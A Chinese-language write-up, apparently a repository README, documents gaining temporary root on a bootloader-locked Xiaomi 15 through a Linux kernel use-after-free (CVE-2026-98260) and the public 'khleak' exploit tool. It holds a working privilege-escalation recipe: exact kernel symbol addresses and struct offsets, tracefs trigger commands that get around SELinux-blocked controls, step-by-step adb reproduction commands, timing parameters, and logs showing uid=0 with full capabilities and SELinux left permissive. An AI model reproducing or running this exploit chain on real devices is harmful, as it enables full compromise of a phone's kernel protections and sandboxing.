# 小米 15（dada）免解锁 BL 临时 root —— 完整过程记录

> 目标机：Xiaomi 15 `dada` / `24129PN74C`，HyperOS `OS4.0.4.0.XOCCNXM`，Android 17 / SDK 37
> 内核：`6.6.118-android15-8-gf72a02f47f4b-abogki551678766-4k`（4 KiB 页，8 核）
> BL 状态：`ro.boot.flash.locked=1`，`verifiedbootstate=green`（**全程未解锁、未刷机**）
> 结果：**2026-11-17 11:21 拿到 `uid=0` + `CapEff=0x1ffffffffff`（FULLCAP）**
> 实测日期：2026-11-17

---

## 1. 一句话结论

用 **CVE-2026-98260**（`fs/exec.c`，非 leader 线程 `execve()` 时的 POSIX CPU timer UAF）拿到
一次性的内核任意写，把当前进程的 `cred` 换成伪造的 root cred。

- **不需要解锁 BL**，不碰 `boot`/`vbmeta`，不触发 AVB，重启后一切归零；
- 成功率不是 100%，本机实测 **3 轮命中**（每轮约 2.5 秒）；
- 失败有一个**安全停车**分支：窗口打开但抢页失败时工具会主动挂死自己等硬重启，
  **不回收僵尸进程**，避免 `rb_erase` 把别人的空闲页当 rbtree 旋转写回导致 panic。

---

## 2. 为什么是这条路

小米 15 的 `bootloader` 锁着，常规手段全部走不通：

| 路线 | 为什么不行 |
|---|---|
| fastboot 刷 Magisk patch 过的 `boot` | `flash.locked=1`，`fastboot flashing unlock` 会清数据且需要账号绑定 7 天 |
| KernelSU 的 GKI 模式 | 需要 `boot` 里有 KSU 的 `kernelsu` 补丁，或 LKM 加载 —— 两者都要能写 `boot`/`vendor_boot` |
| APatch | 同样依赖可写的 boot 分区 |
| 厂商签名漏洞提权 | HyperOS 4 已封 `miui.mqsas.IMQSNative` 的 `code 21` 通道 |
| **内核 CVE + 内存利用** | ✅ 唯一不碰分区、不碰 AVB 的路 |

选 `CVE-2026-98260` 而不是 `CVE-2026-64560` 的原因：前者是 `execve()` 路径上的
`posix_cpu_timers_exit` / `bprm->point_of_no_return` 时序问题，**在 `fs/exec.c` 里就能闭环**，
不依赖 `signal.c` 的额外窗口，公开的可用实现（`khleak`）也更成熟。

### 漏洞机制（简化）

非 leader 线程 B 上 arm 一个 `CLOCK_THREAD_CPUTIME_ID` 的 POSIX timer，然后 B 调 `execve()`：

```
B: timer_create + timer_settime      → 节点入队到 B 的 posix_cputimers
B: execve()
   de_thread(B) → exchange_tids(B, leader)   ← B 的 PID 转给了 leader
   release_task(leader) → __exit_signal → posix_cpu_timers_exit(leader)  ← 清的是 leader 的队列
   __unhash_process(leader)                  ← 那个 PID 已经没有 task 了
   exec_mmap() → mmap_read_lock_killable(old_mm) → kill(B, SIGKILL) → -EINTR
   do_exit() → exit_itimers() → posix_timer_delete() → posix_cpu_timer_del()
       ↑ 这里 timer_lock_sighand() 用 PID 反查 task 失败，误判"节点已出队"，什么都不做
       ↑ k_itimer 被 free，但它的 rb_node 还挂在 B 的 posix_cputimers 树上
   wait4() → release_task(B) → posix_cpu_timers_exit(B) → cleanup_timerqueue()
       ↑ rb_erase 去删一个已经 free 的节点
```

修复（mainline `acb03d388181`）就是把这段清理**搬到 `de_thread()` 之后**，新增
`static void posixtimer_exec(struct task_struct *me)`。

被 free 的 `k_itimer` 落在 `posix_timers_cache`（本机 `objsize=264, 31 obj/slab, order-1`），
于是整页（8 KiB）回到 buddy，用 `AF_UNIX SOCK_STREAM` 写 8192 字节（`kmalloc(8192)` → order-1）
把它抢回来，页内容完全可控 —— 这就是任意写。

### 利用工具

[`RMDycz/K80Pro-miro-CVE-2026-98260`](https://github.com/RMDycz/K80Pro-miro-CVE-2026-98260)
的 `khleak`（build tag `2026-11-16-hazardfix v25`）。

---

## 3. 验证过程（这是整件事里最花时间的部分）

拿到别人的 exploit 直接跑是赌博：**地址错一个就是 `rb_erase` 拿垃圾页旋转 → 立刻 panic**。
所以在手机上跑任何东西之前，先把"这台机器的内核到底长什么样"钉死。

### 3.1 只下 `boot` 分区，不下 8.8 GB 整包

官方 OTA（`dada-ota_full-OS4.0.4.0.XOCCNXM-user-17.0-92227559a4.zip`，8795504847 字节）
是 A/B `payload.bin` 格式：`CrAU` + version + manifest_size + metadata_signature_size + 349 分区 manifest + blobs。

做法：HTTP Range 逐段读，**先解析 manifest 校验 metadata 哈希**，再只下 `boot` 分区那 48 个
download 操作（合计 10.8 MB），逐 op 校验 SHA-256，最后校验整分区 SHA-256。

| 产物 | SHA-256 |
|---|---|
| `boot-stock.img`（header v4） | `7935a651b43945b020bd02744489e1f1f7eeff032bb6c245b70fd31b0c1e2a2f` |
| `Image`（拆出来的 arm64 内核，36866560 字节） | `7c9ecc459dde9a87c1fd9d8c0227cee1957ac8cde7f9d6cbe9aba4a3cbf6f91d` |

banner 确认：

```
Linux version 6.6.118-android15-8-gf72a02f47f4b-abogki551678766-4k (kleaf@build-host)
(Android (11368308, +pgo, +bolt, +lto, +mlgo, based on r510928) clang version 18.0.0, LLD 18.0.0)
#1 SMP PREEMPT Thu Aug 27 01:49:35 UTC 2026
```

> 顺带踩到的坑：`bkt-sgp-miui-ota-update-alisgp.oss-ap-southeast-1.aliyuncs.com` 在本机 Python
> `urllib` 下 TLS 直接 `UNEXPECTED_EOF`；换 `bn.d.miui.com` + `Referer: https://www.miui.com/`
> 才稳定 200。`hugeota.d.miui.com` 是 `403 referer-acl-deny`。

### 3.2 恢复 110327 个符号，把 profile 逐项对死

内核去压缩后是裸 `Image`（`ARMd` magic），用 `vmlinux-to-elf` 的 `KallsymsFinder` 把内嵌
kallsyms 表还原成 `Image.kallsyms`（110327 条）。

然后把 `khleak` 里 miro（K80 Pro）`HyperOS 4.0.3.0` 那条 profile 的地址**逐项比对**：

| 符号 | profile 期望 | dada 实际 | |
|---|---|---|---|
| `_text` | `0xffffffc080000000` | 同 | ✅ |
| `_stext` | `0xffffffc080010000` | 同 | ✅ |
| `__arm64_sys_getpid` | `0xffffffc0800cda70` | 同 | ✅ |
| `__arm64_sys_gettid` | `0xffffffc0800cdaa0` | 同 | ✅ |
| `__arm64_sys_getppid` | `0xffffffc0800cdad0` | 同 | ✅ |
| `__set_task_comm` | `0xffffffc0803d4ac4` | 同 | ✅ |
| `do_timer_create` | `0xffffffc080195cf4` | 同 | ✅ |
| `copy_process` | `0xffffffc0800ab7fc` | 同 | ✅ |
| `prepare_creds` | `0xffffffc0800e4040` | 同 | ✅ |
| `commit_creds` | `0xffffffc0800e45e8` | 同 | ✅ |
| `selinux_state` | `0xffffffc08237a350` | 同 | ✅ |
| `init_user_ns` | `0xffffffc08214ef90` | 同 | ✅ |
| `root_user` | `0xffffffc08214f220` | 同 | ✅ |
| `init_groups` | `0xffffffc082150780` | 同 | ✅ |
| `init_ucounts` | `0xffffffc082150cf0` | 同 | ✅ |
| `init_task` | `0xffffffc08213e2c0` | 同 | ✅ |
| `init_cred` | `0xffffffc082150788` | 同 | ✅ |
| `posix_timers_cache` | `0xffffffc08235c760` | 同 | ✅ |
| `memstart_addr` | `0xffffffc0816873e8` | 同 | ✅ |
| `kimage_voffset` | `0xffffffc0816874a0` | 同 | ✅ |

三个 `_RET_IP_` 派生值（不落在符号表上，要算）也全对：
`do_timer_create+0xa8 = 0xffffffc080195d9c`、`copy_process+0x140 = 0xffffffc0800ab93c`、
`prepare_creds+0x24 = 0xffffffc0800e4064`。

**结论：`OS4.0.4.0` 的 dada 内核就是 miro `OS4.0.3.0` 那一个 GKI 构建（`abogki551678766`）**，
profile 可用不是靠 `uname` 字符串撞上的，是 23 个地址全等。

### 3.3 结构体偏移不信 BTF，信反汇编

`/sys/kernel/btf/vmlinux` 在 shell 身份下是 `Permission denied`（连目录 stat 都被 SELinux 挡），
所以偏移只能从内核本体上验：

| 字段 | 偏移 | 证据（反汇编） |
|---|---|---|
| `real_cred` | `0x818` | `commit_creds`：`ldr x19,[x20,#0x818]`；`add x8,x20,#0x818; stlr x21,[x8]` |
| `cred` | `0x820` | `commit_creds`：`ldr x8,[x20,#0x820]`；`add x8,x20,#0x820; stlr x21,[x8]` |
| `comm` | `0x830` | `__set_task_comm+0x34: add x0,x19,#0x830`；`copy_process: add x0,x20,#0x830` |
| `pid` | `0x618` | `copy_process` 里 `__set_task_comm` 探针的 `tpid=+0x618` |
| `tgid` | `0x61c` | 同上 |
| `sighand` | `0x880` | `copy_process` 里 5312 字节 `task_struct` 的 sighand 指针写入 |

`task_struct` 是 **5312 字节**（不是 4800），`/proc/slabinfo` 直接读到
`task_struct objsize=5312 obj/slab=6 pages/slab=8` —— `4800 + 512` 正是
`CONFIG_ANDROID_VENDOR_TASK_STRUCT_SIZE` 追加的保留区。

### 3.4 确认漏洞真的没修

这一步决定"要不要跑"：

1. kallsyms 里**没有** `posixtimer_exec`，原始字节里也搜不到这个串；
2. `begin_new_exec` 的调用序列是：

```
de_thread → exchange_tids → release_task → unshare_files → dma_buf_begin_new_exec
→ set_mm_exe_file → would_dump → acct_arg_size → exec_mmap → exec_task_namespaces
→ posix_cpu_timers_exit / exit_itimers / flush_itimer_signals / unshare_sighand
```

   即**旧顺序**：清理在所有失败点之后。修复版会把这段搬到 `de_thread()` 之后。
3. `exec_mmap` 里仍是 `down_write_killable` + `down_read_killable`，`-EINTR` 这条失败路径还在。

三条同时成立 → 窗口真实存在。

### 3.5 二进制与源码一致性（消除"跑别人的黑盒"）

仓库 1.2.0 的 release 资产里 build tag 是 `v25`，而 tag `1.2.0` 的源码是 `v24` —— 这个错位
一度是最大阻塞（没法证明资产就是你审计过的代码）。

消除方式：装 NDK r29（clang 21.0.0，正是资产 `.comment` 里那一个），用 main HEAD 源码本地重建，**逐段比对**：

```
SAME .text        85684 字节完全相同
SAME .rodata / .data / .data.rel.ro / .dynsym / .rela.* / .plt / .eh_frame
DIFF .comment     只有编译路径字符串不同
```

→ 资产就是这份源码编出来的，版本号错位是发布疏漏。二进制里也没有任何 URL/IP
（只有 `/data/local/tmp` 路径和 `4.0.3.0` 版本串），socket 相关导入只服务本地 rootd。

| 二进制 | SHA-256 |
|---|---|
| release 资产 | `ac908d4089fd150fef36055f17e3ed056c8773e31f5ab7edcd428424db546ca2` |
| 本地重建 | `9a6b6d6a8a3c6c1f007f31d523842370292a87b92c98a1ed9d9cc790a801d190`（`.text` 与资产相同） |

---

## 4. 实测过程

### 4.1 第一次：安全停车（fail-closed）

`khleak root --attempts 2` → 进入 `plant_park_fail_closed()`。

判定依据：进程 comm 被改成 **`khleak-park`**（这个字符串只出现在该函数里），
`state=S`、`wchan=__arm64_sys_nanosleep`、`utime/stime` 三次采样完全不变。

含义：**窗口已打开（timer 已 free、节点仍在树上），但抢页失败**。此时回收僵尸会让
`rb_erase` 把别人的空闲页当 rbtree 旋转写回 → panic。工具于是主动挂死自己、
忽略 `SIGINT/SIGTERM/SIGHUP/SIGQUIT/SIGALRM`，只等你硬重启。

现场见 [`docs/probe-xiaomi15-20261117-1112-park.txt`](docs/probe-xiaomi15-20261117-1112-park.txt)。

> **坑**：当时用 `| tail -60` 接 stdout，缓冲区要等 EOF 才吐 —— 停车时整段 ERR 横幅
> 一个字都没出来，只能靠 `comm=khleak-park` 反推状态。**以后一律重定向到文件。**

处置：长按电源 10 秒硬重启（硬复位不经过收尸路径）。重启后确认
`boot_id` 变了、`khleak-park` 没了、`khl`/`kd` 探针自动清空、SELinux 回到 `Enforcing`。

### 4.2 重启后的两项前置检查

**① `carrier-test`（不碰漏洞窗口）**

```
carriers=64 len=8000 mark_off=0xE78
✔ payload 完整可控：8000 字节逐字节一致
--- rb_node 偏移分析 ---
  obj[30] off=7920 node=8040 ✗ 超出 payload（应避开该索引）
```

载体机制在 dada 上没问题，把"载体能不能用"和"竞态中不中"两件事分开了。

**② tracefs 的间接 arm 通道**

抢页判据靠 `kmem:mm_page_free` / `mm_page_alloc` 的 pfn，但这两个事件的 `enable` 是
`0640 root:readtracefs`，`format`/`enable` 被 SELinux 直接挡（`cat .../format` → EACCES），
**即使 shell 在 `readtracefs`(3012) 组里也不行**。必须走 0666 的 `rss_stat/trigger`：

```bash
echo "enable_event:kmem:mm_page_free"  > /sys/kernel/tracing/events/kmem/rss_stat/trigger
echo "enable_event:kmem:mm_page_alloc" > /sys/kernel/tracing/events/kmem/rss_stat/trigger
cat /sys/kernel/tracing/events/kmem/mm_page_alloc/enable   # → 1*
```

**这一步没确认就开跑，等于让工具在"看不见页"的情况下空跑 —— 第一次停车大概率就是这个原因。**

### 4.3 第二次：第 3 轮命中

```bash
adb shell '/data/local/tmp/khleak root --attempts 6 --hold > /data/local/tmp/kh.log 2>&1'
```

```
[stream] page_freed=1 free_cpu=0
[stream] free 行:  rcuop/0-18  [000] b.... 233.095717: mm_page_free: page=... pfn=0xafb74 order=1
[stream] HIT pfn=0xafb74
[stream] 命中行:   khl-task-b-9169 [000] ..... 233.173901: mm_page_alloc: page=... pfn=0xafb74 order=1
[stream] writes=80 hit=1
[uaf] child=9183 code=2 status=9
[uaf] del=2048  del(head!=0)=1  pe=3  ei=2
[uaf] => 窗口【已打开】：节点在 release_task 时仍在树上
[holder] getuid=0
[holder] 当前 id：uid=0 euid=0 gid=0 egid=0
[renew] REAL_CRED_ACTIVE uid=0 gid=0 cap=0x1ffffffffff
==================== 提权成功 ====================
rootd 已在 uid=0 + FULLCAP 下常驻
```

三个统计指标：`del(head!=0)=1`（窗口开了）、`page_freed=1` + `HIT pfn`（页抢到了）、
`REAL_CRED_ACTIVE`（cred 真的换了）。完整日志
[`docs/probe-xiaomi15-20261117-1121-root-success.txt`](docs/probe-xiaomi15-20261117-1121-root-success.txt)。

---

## 5. 最终效果

```
$ khleak su -c "id; getenforce"
uid=0(root) gid=0(root) groups=0(root) context=u:object_r:unlabeled:s0
Permissive

$ grep -E "Uid|CapEff" /proc/<rootd>/status
Uid:     0  0  0  0
CapEff:  000001ffffffffff        ← FULLCAP
```

能力验证：

| 项 | 结果 |
|---|---|
| `uid=0` / `gid=0` | ✅ |
| `CapEff` | ✅ `0x1ffffffffff`（全 41 位） |
| 读 `/proc/iomem` | ✅（之前 `errno=13`） |
| `dmesg` | ✅ |
| 读 `/sys/kernel/btf/vmlinux` | ✅（6127240 字节，之前 EACCES） |
| 内核告警 | ✅ `dmesg` 里 `kernel BUG|WARNING:|Oops` 计数 = **0** |

用法：

```bash
adb shell /data/local/tmp/khleak su -c 'your command'   # 单次
adb shell /data/local/tmp/khleak su                     # 交互 root shell
```

### 副作用（必须知道）

| 项 | 状态 | 怎么恢复 |
|---|---|---|
| SELinux | **`Permissive`**（root 路径强制先关） | 只有重启能回 `Enforcing`；`clean` 清不掉 |
| `/data/local/tmp` | `0777`（ephemeral 进程要在里面放东西） | `khleak restore` 或重启 |
| root 本身 | 内存态，重启即失效 | 重跑一次（本机 3 轮内成功） |
| `.khleak-load` | 记了 7 秒负载账 | 重启清零 |

### slab 几何与负载账（本机实测）

利用链能不能走通，取决于这三个缓存的对象尺寸对不对得上。`/proc/slabinfo` 实测：

| slab 缓存 | objsize | obj/slab | pages/slab | active / total | 在链里的角色 |
|---|---|---|---|---|---|
| `posix_timers_cache` | 264 | 31 | 2（order-1，8 KiB） | 434 / 589 | `k_itimer` 落点。被 free 的正是这一页，抢页抢的也是它 |
| `task_struct` | 5312 | 6 | 8 | 4114 / 4824 | `4800 + 512`（`CONFIG_ANDROID_VENDOR_TASK_STRUCT_SIZE`）；`cred`/`comm` 偏移都相对它 |
| `cred_jar` | 192 | 21 | 1 | 1892 / 2373 | 伪造 cred 落地后被内核真正引用的对象 |

三个数字互相咬合：`objsize=264` → 31 个填满一整张 order-1 页 → 只要抢到那张 8 KiB 页，
payload 就能按 `obj_index * 264` 精确覆盖任意一个 `k_itimer`；而 `task_struct` 是 5312 而不是 4800，
`cred` 落在 `0x820` —— 这也是不照抄 4800 布局的原因。

负载账：

```bash
$ cat /data/local/tmp/.khleak-load
5a4fb408-bccc-45e1-927e-0ec8d0d7b7f2 7
```

两个字段是 **`boot_id` + 本机开机以来累计消耗秒数**（第一次停车那轮 + 成功那轮合计 7 秒）。
`boot_id` 一换就自动归零，所以它既是账本，也是"这台机器还是不是我上次记账的那次开机"的判据。

预算有两个，别混：

| 名字 | 值 | 性质 |
|---|---|---|
| `--budget-s` | 75（默认） | 单条命令的总预算，超了主动收工 |
| `KH_BOOT_BUDGET` | 9999（编译期常量，可环境变量覆盖） | 按 `boot_id` 记账的累计上限，实际不构成卡口 |

真正会杀人的不是这两个数，是 **watchdog**：`--lockers` 各做上百 MB `mprotect`，3 核满载超过约 90 秒就死机。
所以"多跑几轮"要分段多次执行，不要拉大 `--attempts`。

---

## 6. 复现步骤

```bash
# 0) 前置：手机已开 USB 调试，adb shell 可用，不要在跑的机器上做别的重活
adb devices

# 1) 推送（用自己编的，别用来源不明的资产）
adb push khleak /data/local/tmp/khleak
adb shell chmod 755 /data/local/tmp/khleak

# 2) 认机 —— 必须命中，认不出来会直接 exit 3，绝不会退化成别的 profile
adb shell /data/local/tmp/khleak profile

# 3) 载体自检（不碰漏洞窗口）
adb shell /data/local/tmp/khleak carrier-test

# 4) 确认 tracefs 间接 arm 通
adb shell 'echo enable_event:kmem:mm_page_free > /sys/kernel/tracing/events/kmem/rss_stat/trigger'
adb shell 'cat /sys/kernel/tracing/events/kmem/mm_page_alloc/enable'   # 期望 1*

# 5) 开跑，日志一定要落文件，不要接管道
adb shell '/data/local/tmp/khleak root --attempts 6 --hold > /data/local/tmp/kh.log 2>&1'
adb shell 'tail -40 /data/local/tmp/kh.log'

# 6) 验证（--hold 让成功进程挂住，从外部读 /proc 最可靠）
adb shell '/data/local/tmp/khleak su -c "id; grep CapEff /proc/self/status"'
```

**如果日志里出现 `khleak-park`**：立刻停手，不要 kill、不要 Ctrl-C、不要断 adb，
长按电源 10 秒硬重启。

### 时序调参优先级

| 参数 | 默认 | 说明 |
|---|---|---|
| `--creator exec` | 已默认 | `other` 实测命中率 0，别改 |
| `--attempts N` | 8 | 单轮约 2.5 s，`--attempts 6` 只花十几秒 |
| `--ntimers N` | 2048 | 64–8192，timer 数 |
| `--writes N` / `--write-rounds N` | 80 / 6 | 每轮 socket 写入次数/轮数 |
| `--exec-delay-us N` | 0 | locker 持锁后 → execve 的额外等待 |
| `--lockers N` | 3 | **硬上限 4**，再多会死机 |
| `--vma N` | 30000 | **硬上限 40000** |
| `--locker-pin N` | 0 | **设 1 会死机** |
| `--budget-s N` | 75 | 单命令总预算（另有 `KH_BOOT_BUDGET`，编译期 9999，按 boot_id 累计） |

> 连续 3 核 120MB `mprotect` 超过约 90 秒会触发 watchdog 死机。
> **要跑更多轮就分段多次执行，不要拉大 `attempts`。**

---

## 7. 产出物

| 文件 | 说明 |
|---|---|
| `artifacts/boot-stock.img` 哈希 / `artifacts/extraction-report.json` | OTA 分区提取与哈希校验记录 |
| `artifacts/kernel-identity.json` | 内核 banner、大小、关键符号串位置 |
| `artifacts/profile-compare.json` | 23 项地址逐条比对结果 |
| `artifacts/layout-verify.json` | 结构体偏移反汇编核验摘要 |
| `artifacts/exec-call-order.json` | `begin_new_exec` 的调用序列（判"补丁在不在"） |
| `artifacts/patch-symbol-hints.json` | 关键符号地址 |
| `tools/extract_boot.py` | HTTP Range 解析 `payload.bin`、校验、提取 `boot`、拆 `Image` |
| `tools/recover_symbols.py` | 从裸 `Image` 恢复 kallsyms |
| `tools/compare_profile.py` | profile 逐项比对 |
| `tools/inspect_patch_order.py` | `begin_new_exec` 反汇编 + 调用序列 |
| `tools/verify_layout.py` | 结构体偏移核验 |
| `docs/probe-*.txt` | 真机日志（预检 / 停车现场 / 成功） |

`Image`（36 MB）与 `Image.kallsyms`（4.6 MB）按需自行重建，仓库不存二进制大件。

---

## 8. 限制与风险

1. **临时 root**：重启即失效，没有持久化。想持久只能每次开机重跑，或者走能写 boot 的路。
2. **SELinux 会变 `Permissive`**：这是降级，别在拿到 root 后放着不管太久。
3. **有 panic 风险**：抢页失败 + 窗口打开 = 必须硬重启；硬重启本身有极小概率丢未落盘数据。
4. **profile 跟着内核走**：内核一升级（比如 `OS4.0.5.x`），23 个地址大概率全变，
   **必须重新按 §3.2 的流程对一遍**，对不上就绝不能跑。
5. **成功率不是 100%**：本机 3 轮命中；作者机型给的 40~60% 是经验值，不构成保证。
6. **不要 kill `khleak-park`**：那是保护机制，不是卡死。

---

## 9. 时间线

| 时间 | 事件 |
|---|---|
| 2026-11-16 | 调研 CVE-2026-64560 / 98260，读 CVE 记录与三个公开实现 |
| 2026-11-17 10:09 | USB ADB 只读预检（设备属性、slab 几何、tracefs 权限） |
| 2026-11-17 10:49 | OTA Range 下载 `boot` 分区，哈希全过，拆出 `Image` |
| 2026-11-17 10:52 | kallsyms 恢复 110327 符号，profile 比对 23/23 |
| 2026-11-17 10:55 | NDK r29 本地重建，`.text` 与 release 资产逐字节相同 |
| 2026-11-17 11:00 | 第一次实机运行 → **安全停车** |
| 2026-11-17 11:14 | 硬重启（`boot_id=5a4fb408…`），残留自动清空 |
| 2026-11-17 11:16 | `carrier-test` 通过；tracefs 间接 arm 验证通过 |
| 2026-11-17 11:21 | **第 3 轮命中，`uid=0` + FULLCAP** |
| 2026-11-17 11:45 | 核查 LSPosed 前提：`/data/adb` 空、无 magisk/ksu/zygisk → 运行期 root 补不上 Zygisk 注入点 |

---

## 10. 附加评估：LSPosed 生态（2026-11-17 实测）

一句话：**装不上，卡点不是版本也不是权限，是没有 boot 期 root。**

- Vector 是 Zygisk 模块（包内 `module.prop`：`id=zygisk_vector`，`Android 8.1 ~ 17`），
  安装器走 Magisk/KernelSU 的 `update-binary` 协议，注入点在 **zygote 启动之前**；
- khleak 给的是**运行期** `uid=0`，zygote 早已 fork，追不回去补注入；
- 实测证据：`/data/adb` 只有 `.`/`..`、无 `modules/`、无 `ksu/`、无 magiskd/ksud 进程、
  `ro.debuggable=0`。所以「ZygiskSU 已在」这条在这台机器上不成立；
- 顺带纠正：「Android 16 上停在 1.9.2、不要升级」在 **A17** 上是反的 ——
  1.9.2 只到 A14，Vector v2.2 自己写着支持到 17。

**但免 root 这条路没被堵死。** 2026-11-17 12:05 实测：LSPatch 0.6 在 A17 上死于
`NoSuchFieldError: android.app.ActivityThread$AppBindData#compatInfo`（该字段 A17 已删），
换成基于 Vector 核心的 **NPatch v1.1.0**（官方声明 Android 17 Ready，`targetSdk=37`）后，
补丁包在本机正常启动 —— 真机日志 `KPROBE: launch-ok sdk=37`，`topResumedActivity=…/.MainActivity`。

| 方案 | 版本 | A17 实测 |
|---|---|---|
| LSPosed / Vector（需 Zygisk） | v2.2 | ❌ 没有 boot 期 root，装不上 |
| LSPatch | 0.6（核心 1.9.2） | ❌ `NoSuchFieldError: AppBindData#compatInfo` |
| **NPatch（免 root，改 APK）** | **v1.1.0（Vector core-837）** | ✅ 起来并跑通 |

管理器已装：`top.nkbe.npatch` `1.1.0 (857)` `targetSdk=37`。
三条路的取舍、6 项模块逐条能不能落地（唯一硬边界是 `system_server` 作用域的
Disable-FLAG_SECURE）、解锁后的完整步骤、NPatch/LSPatch 的命令与实测日志，都在
[`docs/lsposed-plan.md`](docs/lsposed-plan.md)。

---

## 11. 声明

本文档记录的是**自己设备的离线验证与实机过程**，用于说明"为什么可以相信这套地址"。
涉及的 CVE 是已公开、已修复（mainline `acb03d388181`，stable 6.6.158 / 6.12.112 / 6.18.54 / 7.2.8）
的内核漏洞；工具来自公开仓库。任何人拿去做别的事与本文无关。
